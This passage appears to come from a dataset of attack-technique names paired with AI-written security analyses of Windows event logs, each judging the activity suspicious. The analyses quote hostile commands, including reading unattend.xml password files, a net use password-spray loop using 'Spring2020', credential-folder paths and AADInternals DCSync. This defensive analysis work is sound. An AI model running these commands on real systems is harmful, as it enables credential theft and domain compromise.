   - There are multiple instances of `MicrosoftEdgeUpdate.exe` being executed (`EventID: 5` with different ProcessIds: 3452, 2468). Notably, one is from a temporary directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU6111.tmp\\MicrosoftEdgeUpdate.exe`), which is atypical. This could indicate an attempt to execute a temporarily downloaded update or a malicious file masquerading as a legitimate process.

2. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - There are several executions of `wevtutil.exe` and `conhost.exe` by `SERVER002\\admin_test`. The execution of `wevtutil.exe`, particularly, is essential in environments where event logs are manipulated or viewed. While these actions may be legitimate in certain administrative contexts, the frequency and sequence can suggest automation or potential log tampering.

3. **Accessing Sensitive Files via `cmd.exe`:**
   - The command `""cmd.exe"" /c type C:\\Windows\\Panther\\unattend.xml & type C:\\Windows\\Panther\\Unattend\\unattend.xml` is executed, which reads sensitive setup files that may contain deployment or administrative password information. This action could be part of reconnaissance activity by an adversary.

4. **Logging and Process Execution:**
   - The logs show consistent activities under the user `SERVER002\\admin_test`, accessing critical system executables and tools. This pattern might represent automation scripts or administrative tasks; however, given the nature of the actions (e.g., reading sensitive files, interacting with system logs via `wevtutil`), it warrants further investigation.

5. **Time Change Events:**
   - The logs indicate a time change by `svchost.exe`. While this could be part of standard time synchronization with time.windows.com, any unintended alteration in time settings could serve as a cover for illicit activities, impacting log integrity.

### Assessment

Based on the information, there are indications of potentially suspicious activity:

- The execution of system files from atypical directories can suggest tampering or bypass strategies.
- The sequence and frequency of log-related tool executions might indicate log tampering or information concealment.
- Commands accessing potentially sensitive configuration files suggest suspicious reconnaissance activity.

### Resolution

**SUSPICIOUS**

These findings warrant further investigation to determine if these actions are part of legitimate administrative behavior or indicative of a compromise. 

### Guidance on How to Proceed

1. **Investigate the Context:**
   - Validate whether the activity could be part of scheduled updates or documented administrative tasks.
   - Review permissions and access logs for `SERVER002\\admin_test` to determine if the actions align with expected behavior.

2. **Analyze Network Traffic:**
   - Scrutinize network logs around the specified times of suspicious events for potential connections to unauthorized external IP addresses, especially related to command execution and file access.

3. **Verify File Integrity:**
   - Use file hashing or other integrity measures to check if system binaries such as `MicrosoftEdgeUpdate.exe` or other critical files have been altered.

4. **Conduct User Interviews:**
   - If possible, interview the user implementing `SERVER002\\admin_test` to understand if the activities align with recently conducted tasks.

5. **Monitor for Continued Activity:**
   - Keep monitoring the system for any recurrence of these activities or additional signs of penetration like creation of new processes or unauthorized changes to system configurations.

This investigation should continue with systematic scrutiny to confirm or refute the hypothesis of malicious activity."
Extracting passwords with findstr,"Based on the analysis of the provided Windows event logs, here is the detailed assessment:

### System and Security Logs:

1. **Time Change Events**: The logs report a time change occurring multiple times within a second, triggered by `svchost.exe`. This could be a routine action by the Windows Time Service (`w32time`) to sync time with a time server (`time.windows.com`), which is typically benign.

2. **Logon and Privilege Events**:
   - An event log with ID 4624 indicates a successful logon as `SYSTEM` via the `services.exe` process, which, when combined with a privilege assignment event (ID 4672) showing high-level privileges like `SeDebugPrivilege`, points to typical system processes and not necessarily suspicious activity. 
   - Multiple failed `MicrosoftAccount` and `WindowsLive` credential access attempts could be a misconfiguration or an application bug since the return code is non-zero. These are concerning but need more context to ascertain intent.

### Windows PowerShell Logs:

1. **PowerShell Activity**: The logs show PowerShell commands attempting to find files with the name related to passwords. The use of `findstr` within PowerShell for searching through documents is suspicious and could indicate an attempt to locate sensitive information.

### Sysmon Logs:

1. **Wevtutil and Conhost Executions**: Multiple instances of `wevtutil.exe` and `conhost.exe` started by `admin_test` were observed. The frequent use of `wevtutil.exe` to query or clear event logs could be an attempt to cover tracks and should be investigated further.

2. **Hostname and Whoami Executions**:
   - Commands like `hostname.exe` and `whoami.exe` are benign by themselves but their occurrence close to suspicious PowerShell activity warrants further investigation.
   
3. **Edge Update Activity**: Frequent legitimate updates via Edge Update are recorded for `MicrosoftEdgeUpdate.exe`. These updates do not show signs of unusual activity and are consistent with legitimate update processes.

### Application Logs:

1. **Edge Update Service Status**: Logs indicating `edgeupdate` service has stopped which aligns with typical software update cycles and does not inherently indicate malicious activity.

### Overall Assessment:

- **Suspicious Command Usage**: The use of PowerShell to execute file searches for potential passwords is the most notable suspicious activity. This behavior is commonly associated with discovery and reconnaissance activities in compromised systems.
- **Frequent Process Creation**: The recurrent and rapid fire creation of system processes like `wevtutil.exe` might indicate potential log tampering or process hiding.

### Conclusion:
- The combination of these activities within the provided logs suggests suspicious behavior; particularly the PowerShell command usage which should not occur without explicit user intent or authorization. 

### Final Resolution:
- **SUSPICIOUS**: The logs contain activity that warrants further investigation. Specifically, focus should be on the PowerShell activity and frequent use of system processes to determine legitimacy and intent.

### Guidance on How to Proceed:
- Conduct a more thorough investigation into the source of the PowerShell scripts to determine intent and origin.
- Validate the legitimacy of the processes associated with `wevtutil.exe` and PowerShell, and ensure no unauthorized changes have been made to the system.
- Check for any anomalies in similar logs from other systems within the network to rule out a widespread compromise.
- Consider increasing security measures such as additional logging, endpoint protection, or network monitoring to prevent potential future incidents."
List Credential Files via PowerShell,"Upon reviewing the provided Windows event logs, I have identified potential indicators of suspicious or potentially malicious activity. Below is an analysis based on the logs provided:

### 1. Windows PowerShell Log

**Suspicious Behavior:**  
- The Windows PowerShell log entries show a command to retrieve hidden files from directories typically associated with credential storage (`C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\` and `C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\`).  
- This action, executed by `powershell.exe`, could indicate an attempt to access sensitive credential information, which is often seen in credential theft attacks.

### 2. Sysmon Log

**Key Observations:**  
- Multiple processes initiated by the user `SERVER002\admin_test` involve system binaries such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe`, alongside PowerShell execution (`powershell.exe`). Execution of these utilities can be typical, but combined with the above PowerShell script, it could hint at post-exploitation activity or reconnaissance attempts.
- `Sysmon` logs show processes like `whoami.exe` and `hostname.exe` being executed, potentially to gather system and user information.  
- The presence of `MicrosoftEdgeUpdate.exe` running multiple times and the application behavior suggests a routine update process, likely benign. However, due diligence should be applied due to its occurrence alongside possibly suspicious PowerShell activity.

### Assessment

- **Potential Threats / Risks Identified:**
  - Access to credential directories with PowerShell is highly suspicious, potentially aiming for credential harvesting.
  - System utility activity could be part of normal operations, but in context, might also suggest enumeration or privilege escalation steps potentially aligned with lateral movement within an organization.
  - Given the context of the PowerShell activity, the surrounding activity should be taken as part of a larger picture that points to potentially malicious intent.

The findings necessitate additional inquiry to either confirm malicious activity or exclude benign administrative actions that align with organizational policies."
Password Spray all Domain Users,"### Analysis of Provided Windows Event Logs

**Suspicious or Anomalous Behavior Identified:**

1. **Unusual Process Executions and Command Line Arguments:**
   - Multiple instances of `cmd.exe` with the command line involving conditional operations and batch file executions were observed:
     - `cmd.exe /c if not exist %%temp%%\\users.txt (exit /b 1)`
     - `cmd.exe /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\parse_net_users.bat""`
     - The execution of `cmd.exe` using complex command for network share access and deletion:
       - `cmd.exe /c @FOR /F %%n in (%%temp%%\\users.txt) do @net use %%logonserver%%\\IPC$ /user:""%%userdomain%%\\%%n"" ""Spring2020""...`
     - These command-line arguments perform operations typically associated with user enumeration or data exfiltration, which can indicate malicious behavior.

2. **Privilege Escalation:**
   - The account `SERVER002\\admin_test` had high integrity level privilege, and commands were executed with elevated privileges. 
   - Event ID 4672 indicates that the user `admin_test` was assigned special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege` and others. These privileges allow extensive access and control over the system and are often leveraged in malicious activities.

3. **Use of Built-in Utilities:**
   - Execution of utilities like `wevtutil.exe`, `whoami.exe`, and `hostname.exe`:
     - These utilities can be leveraged by attackers for reconnaissance, to gather system information, user information, and clear event logs (`wevtutil.exe`).

4. **Time Change Events:**
   - Kernel-General and Security-Auditing logs show time manipulation events (Event ID 1 and 4616), which can indicate tampering to mislead detection systems or audit logs.

**Malicious Indicators:**
- The presence of batch file execution, enumeration commands, and misuse of privileges points towards activities synonymous with malware or attacker presence within the network.
- The batch file `parse_net_users.bat` and the network share access command could denote credential harvesting or lateral movement.
  
**Risk Assessment:**
- The behavior observed in the logs aligns with techniques used in cyber attacks, such as privilege escalation, persistence, and lateral movements within a network. This could be a precursor to data theft or further compromise.

ADFS token signing and encryption certificates theft - Remote,"After carefully analyzing the provided Windows event logs, several points of interest emerge:

1. **Security Event Logs**:
   - Event Log ID 4616: Time changes logged by `svchost.exe` process. This is common when system time synchronization occurs, usually by services such as the Windows Time Service. The time source referenced is `time.windows.com`, which is typical for a Windows environment and does not indicate malicious activity.

2. **Sysmon Logs**:
   - Regular process creation events involving `powershell.exe` and tools like `conhost.exe`. Use of `powershell.exe` could be routine, given it is used for legitimate administration tasks. However, a PowerShell command involves importing modules like `AADInternals` and using functions such as `DCSync`, which is typically associated with credential dumping techniques (Active Directory and Domain Controller interactions hints towards possible unauthorized access).
   - The execution of `wevtutil.exe` multiple times by the `admin_test` user could signify log manipulation or querying, especially when tied to PowerShell command execution.
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related executables indicate automatic browser update processes occurring, generally benign unless they deviate from typical update behavior paths.

3. **System Logs**:
   - Reflect time change synchronization and other kernel-related events; appear routine.

4. **Windows PowerShell Logs**:
   - PowerShell activity mirrors the Sysmon logs, indicating invocation for administrative context with the possible intent to access or alter sensitive Active Directory information. The `AADInternals` module is a tool often used for auditing and can also be employed for offensive purposes.

5. **Application Logs**:
   - Entries related to Edge update processes stopping are observed. These are aligned with regular application maintenance and do not showcase immediate threat.

**Assessment**:
- The presence of PowerShell script usage involving `AADInternals` and references to functions used in credential extraction raise alerts of potentially suspicious activity.
- The command usage suggests this could be an attacker performing reconnaissance or attempting unauthorized access within a domain environment.
- Regular updates and time synchronization in logs align with expected and benign operations without any indication of being out of ordinary.

**Resolution**:
Based on the irregular PowerShell activity undertaken during the time frame, which utilizes potentially sensitive modules and functions, the resolution is:

- **SUSPICIOUS**: The logs suggest activity that needs further investigation, specifically concerning the PowerShell scripts, the `admin_test` user account activities, and any corresponding network logs around these timestamps for potential unauthorized access. Verify the legitimacy of these actions with the infrastructure or systems administrator and determine if this aligns with known administrative procedures."
